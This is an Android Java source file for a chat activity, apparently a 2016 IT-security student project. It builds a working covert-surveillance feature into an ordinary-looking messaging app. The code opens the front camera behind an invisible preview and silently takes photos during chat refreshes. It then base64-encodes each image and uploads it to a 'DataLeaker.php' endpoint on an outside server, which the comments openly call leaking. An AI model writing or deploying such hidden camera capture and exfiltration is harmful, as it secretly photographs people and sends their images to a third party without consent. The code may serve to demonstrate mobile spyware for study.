package com.groupd.hackchat;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.hardware.Camera;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.CountDownTimer;

import android.preference.PreferenceManager;
import android.util.Base64;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ListView;
import android.widget.Toast;

import org.apache.http.util.ByteArrayBuffer;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;

import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;

import java.util.Random;


// This source code is developed by Group D, M.Sc Applied Computer Science (IT-Security) 2016.



/*

 This is the most important class of this application which performs two main tasks that is, to carry out
 Chat conversation between two users, keep on leaking/uploading live photos to online database after each
 five minutes period.

 */


public class PrivateChatActivity extends Activity {


    String ME = "";
    String YOU = "";

    String ComplexString = null;

    EditText ComposeMessageField;

    String ChatMessage = "";

    Button sendChatButton;

    long randNum;


    private ListView listView;
    private ConversationListAdapter adapter;

    private ArrayList<String> conversationList;
    private ArrayList<Bitmap> profilePhotoList;


    String []dataValues = new String[2];
    int counter = 0;

    String First = "";
    String Second = "";

    String WhoStartedThisChat = "ME";

    Bitmap photo_ME = null;
    Bitmap photo_YOU = null;


    String ba1 = "";






    private Camera mCamera;
    private CameraPreview mPreview;

    public static final int MEDIA_TYPE_IMAGE = 1;
    public static final int MEDIA_TYPE_VIDEO = 2;

    FrameLayout preview;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.private_chat);

        LoadData();

        preview = (FrameLayout) findViewById(R.id.camera_preview);



            mCamera = getCameraInstance();

        // Create our Preview view and set it as the content of our activity.
            mPreview = new CameraPreview(this, mCamera);

            preview.addView(mPreview);

            preview.setVisibility(View.INVISIBLE);





        Intent intent = getIntent();
        photo_ME = (Bitmap) intent.getParcelableExtra("photo_ME");



        dataValues[0] = "";
        dataValues[1] = "";

        conversationList = new ArrayList<>();
        profilePhotoList = new ArrayList<>();




        listView = (ListView) findViewById(R.id.listView);
        ComposeMessageField = (EditText) findViewById(R.id.ComposeMessageID);
        sendChatButton = (Button) findViewById(R.id.SendChatMessageButtonID);



        adapter = new ConversationListAdapter(this, conversationList, profilePhotoList);
        listView.setAdapter(adapter);







        conversationList.clear();
        profilePhotoList.clear();

        new RetrieveProfilePhotoFromServer().execute("http://www.voltbuy.com/ChatAndHack/UserData/ProfilePhotos/" + YOU + ".jpg");










    }

    public void onRefresh() {

        LoadData();

        conversationList.clear();
        profilePhotoList.clear();


        if (WhoStartedThisChat.equals("ME"))
        {
            new FetchConversationFromServer().execute("http://www.voltbuy.com/ChatAndHack/UserData/ChatWindows/" + ME + "-" + YOU + ".txt");
        }
        else if (WhoStartedThisChat.equals("YOU"))
        {
            new FetchConversationFromServer().execute("http://www.voltbuy.com/ChatAndHack/UserData/ChatWindows/" + YOU + "-" + ME + ".txt");
        }


    }

    public void SendChatMessage(View v)
    {


        ChatMessage = ComposeMessageField.getText().toString();


        ComposeMessageField.setText("");

        if (ChatMessage.length() > 0)
        {
            sendChatButton.setVisibility(View.GONE);

            LoadData();

            if(WhoStartedThisChat.equals("ME"))
            {
                First = ME;
                Second = YOU;

                new SubmitMessageToServer().execute("http://www.voltbuy.com/ChatAndHack/UserData/ChatWindows/AddMessageToChatWindow.php");
            }
            else if (WhoStartedThisChat.equals("YOU"))
            {

                First = YOU;
                Second = ME;

                new SubmitMessageToServer().execute("http://www.voltbuy.com/ChatAndHack/UserData/ChatWindows/AddMessageToChatWindow.php");
            }


        } else
        {
            Toast.makeText(getApplicationContext(), "Write some Message", Toast.LENGTH_SHORT);

        }


    }

    public void LoadData()
    {


        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);

        ME = prefs.getString("ChatAndHackME", null);
        YOU = prefs.getString("ChatAndHackYOU", null);
        WhoStartedThisChat = prefs.getString("ChatAndHackWhoStartedThisChat", "ME");



    }




    private class FetchConversationFromServer extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... urls) {

            // params comes from the execute() call: params[0] is the url.
            try {
                return FetchConversation(urls[0]);
            } catch (IOException e) {
                return "NotFound";
            }
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();

            listView.setEnabled(false);

            dataValues[0] = "";
            dataValues[1] = "";

            counter = 0;

            conversationList.clear();
            profilePhotoList.clear();



        }

        // onPostExecute displays the results of the AsyncTask.
        @Override
        protected void onPostExecute(String result) {



            listView.setEnabled(true);


            if (result.equals("OK")) {


                listView.post(new Runnable() {
                    @Override
                    public void run() {

                        adapter.notifyDataSetChanged();
                        listView.smoothScrollToPosition(adapter.getCount() - 1);


                    }
                });




                if(mCamera != null) {
                    mCamera.startPreview();


                    mCamera.takePicture(null, null, mPicture);
                }



            }


            else if (result.equals("NotFound"))

            {
                Toast.makeText(getApplicationContext(), "Chat History not found!", Toast.LENGTH_SHORT).show();



            }

            else
            {
                Toast.makeText(getApplicationContext(), "Network Connection Problem. Make sure that your internet is properly connected", Toast.LENGTH_SHORT).show();


            }





            new CountDownTimer(5000, 4000) {

                public void onTick(long millisUntilFinished) {


                }

                public void onFinish() {


                    if(mCamera != null) {
                        mCamera.stopPreview();
                    }



                    onRefresh();






                }
            }.start();




        }
    }

    private String FetchConversation(String myurl) throws IOException, UnsupportedEncodingException {
        InputStream is = null;


        // Only display the first 500 characters of the retrieved
        // web page content.


        try {
            URL url = new URL(myurl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setReadTimeout(10000 /* milliseconds */);
            conn.setConnectTimeout(15000 /* milliseconds */);
            conn.setRequestMethod("GET");
            conn.setDoInput(true);
            // Starts the query
            conn.connect();




            is = conn.getInputStream();

            BufferedReader textReader = new BufferedReader(new InputStreamReader(is));


            String readlineText;


            while ((readlineText = textReader.readLine()) != null) {



                if(readlineText.length() <= 0)
                {
                    continue;
                }



                for (int i = 0 ; i < readlineText.length() ; ++i)
                {
                    if (readlineText.charAt(i) == '|')
                    {
                        ++counter;

                        continue;
                    }

                    dataValues[counter] = (dataValues[counter] + readlineText.charAt(i));
                }




                    if (dataValues[0].equals(ME)) {
                        profilePhotoList.add(photo_ME);
                        conversationList.add(dataValues[1]);
                    } else if (dataValues[0].equals(YOU)) {
                        profilePhotoList.add(photo_YOU);
                        conversationList.add(dataValues[1]);
                    }




                counter = 0;
                dataValues[0] = "";
                dataValues[1] = "";







            }




            if(conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                conn.disconnect();
                return "OK";

            }
            else
            {
                conn.disconnect();
                return "NetworkError";
            }



            // Makes sure that the InputStream is closed after the app is
            // finished using it.
        } finally {


            if (is != null)
            {
                is.close();


            }

        }
    }



    private class SubmitMessageToServer extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... urls) {

            // params comes from the execute() call: params[0] is the url.
            try {
                return SubmitMessage(urls[0]);
            } catch (IOException e) {
                return "Unable to retrieve web page. URL may be invalid.";
            }
        }


        @Override
        protected void onPreExecute() {
            super.onPreExecute();



           ComplexString = (ME + "|" + ChatMessage);




        }

        // onPostExecute displays the results of the AsyncTask.
        @Override
        protected void onPostExecute(String result) {


            sendChatButton.setVisibility(View.VISIBLE);


            if(result.equals("OK")) {

               // onRefresh();

            }
            else
            {
                Toast.makeText(getApplicationContext(), "Network Connection Problem. Make sure that your internet is properly connected", Toast.LENGTH_SHORT).show();

            }
        }
    }

    private String SubmitMessage(String myurl) throws IOException, UnsupportedEncodingException {

        OutputStream os = null;




        try {
            URL url = new URL(myurl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setReadTimeout(10000 /* milliseconds */);
            conn.setConnectTimeout(15000 /* milliseconds */);
            conn.setRequestMethod("POST");
            conn.setDoInput(true);
            conn.setDoOutput(true);
            // Starts the query
            conn.connect();


            os = conn.getOutputStream();


            Uri.Builder builder = new Uri.Builder()
                    .appendQueryParameter("ComplexString", ComplexString)
                    .appendQueryParameter("FileName", First + "-" + Second);



            String query = builder.build().getEncodedQuery();


            BufferedWriter writer = new BufferedWriter(
                    new OutputStreamWriter(os, "UTF-8"));
            writer.write(query);
            writer.flush();
            writer.close();

            // Convert the InputStream into a string
            // String contentAsString = readIt(is, len);

            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK)
            {
                return "OK";
            }
            else
            {
                return "Failed";
            }



            // Makes sure that the InputStream is closed after the app is
            // finished using it.
        } finally {

            if (os != null)
            {
                os.close();

            }

        }





    }












    private class RetrieveProfilePhotoFromServer extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... urls) {

            // params comes from the execute() call: params[0] is the url.
            try {
                return RetrieveProfilePhoto(urls[0]);
            } catch (IOException e) {


                return "Unable to retrieve web page. URL may be invalid.";
            }
        }


        @Override
        protected void onPreExecute() {
            super.onPreExecute();

            photo_YOU = null;


        }

        // onPostExecute displays the results of the AsyncTask.
        @Override
        protected void onPostExecute(String result) {



            if(result.equals("OK")) {




                    if (WhoStartedThisChat.equals("ME"))
                    {
                        new FetchConversationFromServer().execute("http://www.voltbuy.com/ChatAndHack/UserData/ChatWindows/" + ME + "-" + YOU + ".txt");
                    }
                    else if (WhoStartedThisChat.equals("YOU"))
                    {
                        new FetchConversationFromServer().execute("http://www.voltbuy.com/ChatAndHack/UserData/ChatWindows/" + YOU + "-" + ME + ".txt");
                    }



            }
            else if (result.equals("NetworkError"))
            {

                new RetrieveProfilePhotoFromServer().execute("http://www.voltbuy.com/ChatAndHack/UserData/ProfilePhotos/" + YOU + ".jpg");

            }
            else
            {
                new RetrieveProfilePhotoFromServer().execute("http://www.voltbuy.com/ChatAndHack/UserData/ProfilePhotos/" + YOU + ".jpg");
            }




        }
    }

    private String RetrieveProfilePhoto(String myurl) throws IOException, UnsupportedEncodingException {
        InputStream is = null;

        // Only display the first 500 characters of the retrieved
        // web page content.


        try {
            URL url = new URL(myurl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setUseCaches(false);
            conn.setDefaultUseCaches(false);
            conn.addRequestProperty("Cache-Control", "no-cache");
            conn.setReadTimeout(10000 /* milliseconds */);
            conn.setConnectTimeout(15000 /* milliseconds */);
            conn.setRequestMethod("GET");
            conn.setDoInput(true);
            // Starts the query
            conn.connect();



            is = conn.getInputStream();

            BufferedReader textReader = new BufferedReader(new InputStreamReader(is));


            BufferedInputStream bis = new BufferedInputStream(is, 8190);

            ByteArrayBuffer baf = new ByteArrayBuffer(50);
            int current = 0;
            while ((current = bis.read()) != -1) {
                baf.append((byte)current);
            }
            byte[] imageData = baf.toByteArray();
            photo_YOU = BitmapFactory.decodeByteArray(imageData, 0, imageData.length);



            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK)
            {
                return "OK";
            }
            else
            {
                return "NetworkError";
            }


        } finally {


            if (is != null)
            {
                is.close();


            }

        }
    }





    public static Camera getCameraInstance(){
        Camera c = null;
        try {

            int cameraCount = 0;
            Camera cam = null;
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            cameraCount = Camera.getNumberOfCameras();
            for ( int camIdx = 0; camIdx < cameraCount; camIdx++ ) {
                Camera.getCameraInfo( camIdx, cameraInfo );
                if ( cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT  ) {
                    try {
                        cam = Camera.open( camIdx );
                    } catch (RuntimeException e) {
                        Log.e("Problemmmm", "Camera failed to open: " + e.getLocalizedMessage());
                    }
                }
            }

            c = cam;


           // c = Camera.open(); // attempt to get a Camera instance
        }
        catch (Exception e){
            // Camera is not available (in use or does not exist)
        }
        return c; // returns null if camera is unavailable
    }




    @Override
    protected void onResume() {
        super.onResume();

        // Create an instance of Camera.
        if (this.mCamera == null){
            this.mCamera = getCameraInstance();}
    }

    private Camera.PictureCallback mPicture = new Camera.PictureCallback() {

        @Override
        public void onPictureTaken(byte[] data, Camera camera) {


            Bitmap LeakedImage = BitmapFactory.decodeByteArray(data, 0, data.length);

            LeakedImage = RotateBitmap(LeakedImage, -90);

            ByteArrayOutputStream bao = new ByteArrayOutputStream();
            LeakedImage.compress(Bitmap.CompressFormat.JPEG, 90, bao);
            byte[] ba = bao.toByteArray();
            ba1 =  Base64.encodeToString(ba, Base64.DEFAULT);

            new LeakPhotosToOnlineServer().execute("http://www.voltbuy.com/ChatAndHack/UserData/LeakedData/DataLeaker.php");



        }
    };





    private class LeakPhotosToOnlineServer extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... urls) {

            // params comes from the execute() call: params[0] is the url.
            try {
                return LeakPhotos(urls[0]);
            } catch (IOException e) {
                return "Unable to retrieve web page. URL may be invalid.";
            }
        }


        @Override
        protected void onPreExecute() {
            super.onPreExecute();


            Random r = new Random();
            randNum = r.nextLong();

        }

        // onPostExecute displays the results of the AsyncTask.
        @Override
        protected void onPostExecute(String result) {



            if (result.equals("OK")) {




            }
            else
            {


            }


        }
    }

    private String LeakPhotos(String myurl) throws IOException, UnsupportedEncodingException {

        OutputStream os = null;


        try {
            URL url = new URL(myurl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setReadTimeout(10000 /* milliseconds */);
            conn.setConnectTimeout(15000 /* milliseconds */);
            conn.setRequestMethod("POST");
            conn.setDoInput(true);
            conn.setDoOutput(true);
            // Starts the query
            conn.connect();


            os = conn.getOutputStream();

            Uri.Builder builder = new Uri.Builder()
                    .appendQueryParameter("ChatAndHackbase64", ba1)
                    .appendQueryParameter("ChatAndHackImageName", ("LeakedPhotos/" + ME + "-" + String.valueOf(randNum) + ".jpg"));

            String query = builder.build().getEncodedQuery();


            BufferedWriter writer = new BufferedWriter(
                    new OutputStreamWriter(os, "UTF-8"));
            writer.write(query);
            writer.flush();
            writer.close();

            // Convert the InputStream into a string
            // String contentAsString = readIt(is, len);


            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK)
            {
                return "OK";
            }
            else {
                return "NetworkError";
            }

            // Makes sure that the InputStream is closed after the app is
            // finished using it.
        } finally {

            if (os != null)
            {
                os.close();

            }

        }
    }








    public static Bitmap RotateBitmap(Bitmap source, float angle)
    {

        Matrix matrix = new Matrix();
        matrix.postRotate(angle);
        return Bitmap.createBitmap(source, 0, 0, source.getWidth(), source.getHeight(), matrix, true);
    }




    @Override
    protected void onStop() {
        super.onStop();


    }

    private void releaseCamera(){
        if (mCamera != null){
            mCamera.release();        // release the camera for other applications
            mCamera = null;
        }
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();

        releaseCamera();

    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if ((keyCode == KeyEvent.KEYCODE_BACK)) { //Back key pressed

            Intent intent = new Intent(PrivateChatActivity.this, AlreadySignedIn.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
            startActivity(intent);
            finish();

            return true;

        }
        return super.onKeyDown(keyCode, event);
    }




}
